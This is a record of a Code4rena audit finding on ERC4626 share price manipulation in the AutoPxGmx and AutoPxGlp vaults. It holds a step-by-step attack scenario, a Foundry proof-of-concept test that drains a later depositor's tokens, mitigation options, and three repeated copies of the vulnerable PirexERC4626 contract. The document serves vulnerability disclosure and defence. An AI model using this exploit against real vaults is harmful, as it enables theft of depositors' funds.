{
  "Title": "[H-05] Underlying assets stealing in `AutoPxGmx` and `AutoPxGlp` via share price manipulation",
  "Content": "\n<https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L156-L165>\n\n<https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L167-L176>\n\n### Impact\n\npxGMX and pxGLP tokens can be stolen from depositors in `AutoPxGmx` and `AutoPxGlp` vaults by manipulating the price of a share.\n\n### Proof of Concept\n\nERC4626 vaults are subject to a share price manipulation attack that allows an attacker to steal underlying tokens from other depositors (this is a [known issue](https://github.com/transmissions11/solmate/issues/178) of Solmate's ERC4626 implementation). Consider this scenario (this is applicable to `AutoPxGmx` and `AutoPxGlp` vaults):\n\n1.  Alice is the first depositor of the `AutoPxGmx` vault;\n2.  Alice deposits 1 wei of pxGMX tokens;\n3.  in the `deposit` function ([PirexERC4626.sol#L60](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L60)), the amount of shares is calculated using the `previewDeposit` function:\n\n    ```solidity\n    function previewDeposit(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToShares(assets);\n    }\n\n    function convertToShares(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n    }\n    ```\n\n4.  Since Alice is the first depositor (totalSupply is 0), she gets 1 share (1 wei);\n5.  Alice then *sends* 9999999999999999999 pxGMX tokens (10e18 - 1) to the vault;\n6.  The price of 1 share is 10 pxGMX tokens now: Alice is the only depositor in the vault, she's holding 1 wei of shares, and the balance of the pool is 10 pxGMX tokens;\n7.  Bob deposits 19 pxGMX tokens and gets only 1 share due to the rounding in the `convertToShares` function: `19e18 * 1 / 10e18 == 1`;\n8.  Alice redeems her share and gets a half of the deposited assets, 14.5 pxGMX tokens (less the withdrawal fee);\n9.  Bob redeems his share and gets only 14.5 pxGMX (less the withdrawal fee), instead of the 19 pxGMX he deposited.\n\n```solidity\n// test/AutoPxGmx.t.sol\nfunction testSharePriceManipulation_AUDIT() external {\n    address alice = address(0x31337);\n    address bob = address(0x12345);\n    vm.label(alice, \"Alice\");\n    vm.label(bob, \"Bob\");\n\n    // Resetting the withdrawal fee for cleaner amounts.\n    autoPxGmx.setWithdrawalPenalty(0);\n\n    vm.startPrank(address(pirexGmx));        \n    pxGmx.mint(alice, 10e18);\n    pxGmx.mint(bob, 19e18);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pxGmx.approve(address(autoPxGmx), 1);\n    // Alice deposits 1 wei of pxGMX and gets 1 wei of shares.\n    autoPxGmx.deposit(1, alice);\n    // Alice sends 10e18-1 of pxGMX and sets the price of 1 wei of shares to 10e18 pxGMX.\n    pxGmx.transfer(address(autoPxGmx), 10e18-1);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pxGmx.approve(address(autoPxGmx), 19e18);\n    // Bob deposits 19e18 of pxGMX and gets 1 wei of shares due to rounding and the price manipulation.\n    autoPxGmx.deposit(19e18, bob);\n    vm.stopPrank();\n\n    // Alice and Bob redeem their shares.           \n    vm.prank(alice);\n    autoPxGmx.redeem(1, alice, alice);\n    vm.prank(bob);\n    autoPxGmx.redeem(1, bob, bob);\n\n    // Alice and Bob both got 14.5 pxGMX.\n    // But Alice deposited 10 pxGMX and Bob deposited 19 pxGMX â€“ thus, Alice stole pxGMX tokens from Bob.\n    // With withdrawal fees enabled, Alice would've been penalized more than Bob\n    // (14.065 pxGMX vs 14.935 pxGMX tokens withdrawn, respectively),\n    // but Alice would've still gotten more pxGMX that she deposited.\n    assertEq(pxGmx.balanceOf(alice), 14.5e18);\n    assertEq(pxGmx.balanceOf(bob), 14.5e18);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider either of these options:\n\n1.  In the `deposit` function of `PirexERC4626`, consider requiring a reasonably high minimal amount of assets during first deposit. The amount needs to be high enough to mint many shares to reduce the rounding error and low enough to be affordable to users.\n2.  On the first deposit, consider minting a fixed and high amount of shares, irrespective of the deposited amount.\n3.  Consider seeding the pools during deployment. This needs to be done in the deployment transactions to avoid front-running attacks. The amount needs to be high enough to reduce the rounding error.\n4.  Consider sending first 1000 wei of shares to the zero address. This will significantly increase the cost of the attack by forcing an attacker to pay 1000 times of the share price they want to set. For a well-intended user, 1000 wei of shares is a negligible amount that won't diminish their share significantly.\n\n**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/275)** \n\n**[kphed (Redacted Cartel) confirmed](https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/407)** \n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-11-redacted-cartel-contest",
  "Code": [
    {
      "filename": "src/vaults/PirexERC4626.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\n/// @notice Minimal ERC4626 tokenized Vault implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/mixins/ERC4626.sol)\n/**\n    @notice Pirex modifications\n            - Add beforeDeposit method\n            - Call beforeDeposit in deposit and mint methods\n            - Add afterWithdraw method\n            - Call afterWithdraw in redeem and withdraw methods\n            - Add afterTransfer method\n            - Call afterTransfer in transfer and transferFrom methods\n */\nabstract contract PirexERC4626 is ERC20 {\n    using SafeTransferLib for ERC20;\n    using FixedPointMathLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /*//////////////////////////////////////////////////////////////\n                               IMMUTABLES\n    //////////////////////////////////////////////////////////////*/\n\n    ERC20 public immutable asset;\n\n    constructor(\n        ERC20 _asset,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol, _asset.decimals()) {\n        asset = _asset;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        DEPOSIT/WITHDRAWAL LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function deposit(uint256 assets, address receiver)\n        public\n        virtual\n        returns (uint256 shares)\n    {\n        if (totalAssets() != 0) beforeDeposit(receiver, assets, shares);\n\n        // Check for rounding error since we round down in previewDeposit.\n        require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(receiver, assets, shares);\n    }\n\n    function mint(uint256 shares, address receiver)\n        public\n        virtual\n        returns (uint256 assets)\n    {\n        if (totalAssets() != 0) beforeDeposit(receiver, assets, shares);\n\n        assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(receiver, assets, shares);\n    }\n\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 shares) {\n        shares = previewWithdraw(assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max)\n                allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        beforeWithdraw(owner, assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n\n        afterWithdraw(owner, assets, shares);\n    }\n\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 assets) {\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max)\n                allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        // Check for rounding error since we round down in previewRedeem.\n        require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n\n        beforeWithdraw(owner, assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n\n        afterWithdraw(owner, assets, shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            ACCOUNTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function totalAssets() public view virtual returns (uint256);\n\n    function convertToShares(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n    }\n\n    function convertToAssets(uint256 shares)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n    }\n\n    function previewDeposit(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToShares(assets);\n    }\n\n    function previewMint(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivUp(totalAssets(), supply);\n    }\n\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n\n    function previewRedeem(uint256 shares)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToAssets(shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     DEPOSIT/WITHDRAWAL LIMIT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function maxDeposit(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxMint(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxWithdraw(address owner) public view virtual returns (uint256) {\n        return convertToAssets(balanceOf[owner]);\n    }\n\n    function maxRedeem(address owner) public view virtual returns (uint256) {\n        return balanceOf[owner];\n    }\n\n    /**\n        @notice Override transfer method to allow for pre-transfer internal hook\n        @param  to      address  Account receiving apxGLP\n        @param  amount  uint256  Amount of apxGLP\n    */\n    function transfer(address to, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        bool status = ERC20.transfer(to, amount);\n\n        afterTransfer(msg.sender, to, amount);\n\n        return status;\n    }\n\n    /**\n        @notice Override transferFrom method to allow for pre-transfer internal hook\n        @param  from    address  Account sending apxGLP\n        @param  to      address  Account receiving apxGLP\n        @param  amount  uint256  Amount of apxGLP\n    */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public override returns (bool) {\n        bool status = ERC20.transferFrom(from, to, amount);\n\n        afterTransfer(from, to, amount);\n\n        return status;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          INTERNAL HOOKS LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function beforeWithdraw(\n        address owner,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function beforeDeposit(\n        address receiver,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterWithdraw(\n        address owner,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterDeposit(\n        address receiver,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterTransfer(\n        address owner,\n        address receiver,\n        uint256 amount\n    ) internal virtual {}\n}"
    },
    {
      "filename": "src/vaults/PirexERC4626.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\n/// @notice Minimal ERC4626 tokenized Vault implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/mixins/ERC4626.sol)\n/**\n    @notice Pirex modifications\n            - Add beforeDeposit method\n            - Call beforeDeposit in deposit and mint methods\n            - Add afterWithdraw method\n            - Call afterWithdraw in redeem and withdraw methods\n            - Add afterTransfer method\n            - Call afterTransfer in transfer and transferFrom methods\n */\nabstract contract PirexERC4626 is ERC20 {\n    using SafeTransferLib for ERC20;\n    using FixedPointMathLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /*//////////////////////////////////////////////////////////////\n                               IMMUTABLES\n    //////////////////////////////////////////////////////////////*/\n\n    ERC20 public immutable asset;\n\n    constructor(\n        ERC20 _asset,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol, _asset.decimals()) {\n        asset = _asset;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        DEPOSIT/WITHDRAWAL LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function deposit(uint256 assets, address receiver)\n        public\n        virtual\n        returns (uint256 shares)\n    {\n        if (totalAssets() != 0) beforeDeposit(receiver, assets, shares);\n\n        // Check for rounding error since we round down in previewDeposit.\n        require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(receiver, assets, shares);\n    }\n\n    function mint(uint256 shares, address receiver)\n        public\n        virtual\n        returns (uint256 assets)\n    {\n        if (totalAssets() != 0) beforeDeposit(receiver, assets, shares);\n\n        assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(receiver, assets, shares);\n    }\n\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 shares) {\n        shares = previewWithdraw(assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max)\n                allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        beforeWithdraw(owner, assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n\n        afterWithdraw(owner, assets, shares);\n    }\n\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 assets) {\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max)\n                allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        // Check for rounding error since we round down in previewRedeem.\n        require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n\n        beforeWithdraw(owner, assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n\n        afterWithdraw(owner, assets, shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            ACCOUNTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function totalAssets() public view virtual returns (uint256);\n\n    function convertToShares(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n    }\n\n    function convertToAssets(uint256 shares)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n    }\n\n    function previewDeposit(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToShares(assets);\n    }\n\n    function previewMint(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivUp(totalAssets(), supply);\n    }\n\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n\n    function previewRedeem(uint256 shares)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToAssets(shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     DEPOSIT/WITHDRAWAL LIMIT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function maxDeposit(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxMint(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxWithdraw(address owner) public view virtual returns (uint256) {\n        return convertToAssets(balanceOf[owner]);\n    }\n\n    function maxRedeem(address owner) public view virtual returns (uint256) {\n        return balanceOf[owner];\n    }\n\n    /**\n        @notice Override transfer method to allow for pre-transfer internal hook\n        @param  to      address  Account receiving apxGLP\n        @param  amount  uint256  Amount of apxGLP\n    */\n    function transfer(address to, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        bool status = ERC20.transfer(to, amount);\n\n        afterTransfer(msg.sender, to, amount);\n\n        return status;\n    }\n\n    /**\n        @notice Override transferFrom method to allow for pre-transfer internal hook\n        @param  from    address  Account sending apxGLP\n        @param  to      address  Account receiving apxGLP\n        @param  amount  uint256  Amount of apxGLP\n    */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public override returns (bool) {\n        bool status = ERC20.transferFrom(from, to, amount);\n\n        afterTransfer(from, to, amount);\n\n        return status;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          INTERNAL HOOKS LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function beforeWithdraw(\n        address owner,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function beforeDeposit(\n        address receiver,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterWithdraw(\n        address owner,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterDeposit(\n        address receiver,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterTransfer(\n        address owner,\n        address receiver,\n        uint256 amount\n    ) internal virtual {}\n}"
    },
    {
      "filename": "src/vaults/PirexERC4626.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\n/// @notice Minimal ERC4626 tokenized Vault implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/mixins/ERC4626.sol)\n/**\n    @notice Pirex modifications\n            - Add beforeDeposit method\n            - Call beforeDeposit in deposit and mint methods\n            - Add afterWithdraw method\n            - Call afterWithdraw in redeem and withdraw methods\n            - Add afterTransfer method\n            - Call afterTransfer in transfer and transferFrom methods\n */\nabstract contract PirexERC4626 is ERC20 {\n    using SafeTransferLib for ERC20;\n    using FixedPointMathLib for uint256;\n\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /*//////////////////////////////////////////////////////////////\n                               IMMUTABLES\n    //////////////////////////////////////////////////////////////*/\n\n    ERC20 public immutable asset;\n\n    constructor(\n        ERC20 _asset,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol, _asset.decimals()) {\n        asset = _asset;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        DEPOSIT/WITHDRAWAL LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function deposit(uint256 assets, address receiver)\n        public\n        virtual\n        returns (uint256 shares)\n    {\n        if (totalAssets() != 0) beforeDeposit(receiver, assets, shares);\n\n        // Check for rounding error since we round down in previewDeposit.\n        require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(receiver, assets, shares);\n    }\n\n    function mint(uint256 shares, address receiver)\n        public\n        virtual\n        returns (uint256 assets)\n    {\n        if (totalAssets() != 0) beforeDeposit(receiver, assets, shares);\n\n        assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n\n        // Need to transfer before minting or ERC777s could reenter.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        _mint(receiver, shares);\n\n        emit Deposit(msg.sender, receiver, assets, shares);\n\n        afterDeposit(receiver, assets, shares);\n    }\n\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 shares) {\n        shares = previewWithdraw(assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max)\n                allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        beforeWithdraw(owner, assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n\n        afterWithdraw(owner, assets, shares);\n    }\n\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public virtual returns (uint256 assets) {\n        if (msg.sender != owner) {\n            uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n            if (allowed != type(uint256).max)\n                allowance[owner][msg.sender] = allowed - shares;\n        }\n\n        // Check for rounding error since we round down in previewRedeem.\n        require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n\n        beforeWithdraw(owner, assets, shares);\n\n        _burn(owner, shares);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        asset.safeTransfer(receiver, assets);\n\n        afterWithdraw(owner, assets, shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            ACCOUNTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function totalAssets() public view virtual returns (uint256);\n\n    function convertToShares(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n    }\n\n    function convertToAssets(uint256 shares)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n    }\n\n    function previewDeposit(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToShares(assets);\n    }\n\n    function previewMint(uint256 shares) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? shares : shares.mulDivUp(totalAssets(), supply);\n    }\n\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n\n    function previewRedeem(uint256 shares)\n        public\n        view\n        virtual\n        returns (uint256)\n    {\n        return convertToAssets(shares);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     DEPOSIT/WITHDRAWAL LIMIT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function maxDeposit(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxMint(address) public view virtual returns (uint256) {\n        return type(uint256).max;\n    }\n\n    function maxWithdraw(address owner) public view virtual returns (uint256) {\n        return convertToAssets(balanceOf[owner]);\n    }\n\n    function maxRedeem(address owner) public view virtual returns (uint256) {\n        return balanceOf[owner];\n    }\n\n    /**\n        @notice Override transfer method to allow for pre-transfer internal hook\n        @param  to      address  Account receiving apxGLP\n        @param  amount  uint256  Amount of apxGLP\n    */\n    function transfer(address to, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        bool status = ERC20.transfer(to, amount);\n\n        afterTransfer(msg.sender, to, amount);\n\n        return status;\n    }\n\n    /**\n        @notice Override transferFrom method to allow for pre-transfer internal hook\n        @param  from    address  Account sending apxGLP\n        @param  to      address  Account receiving apxGLP\n        @param  amount  uint256  Amount of apxGLP\n    */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public override returns (bool) {\n        bool status = ERC20.transferFrom(from, to, amount);\n\n        afterTransfer(from, to, amount);\n\n        return status;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          INTERNAL HOOKS LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function beforeWithdraw(\n        address owner,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function beforeDeposit(\n        address receiver,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterWithdraw(\n        address owner,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterDeposit(\n        address receiver,\n        uint256 assets,\n        uint256 shares\n    ) internal virtual {}\n\n    function afterTransfer(\n        address owner,\n        address receiver,\n        uint256 amount\n    ) internal virtual {}\n}"
    }
  ]
}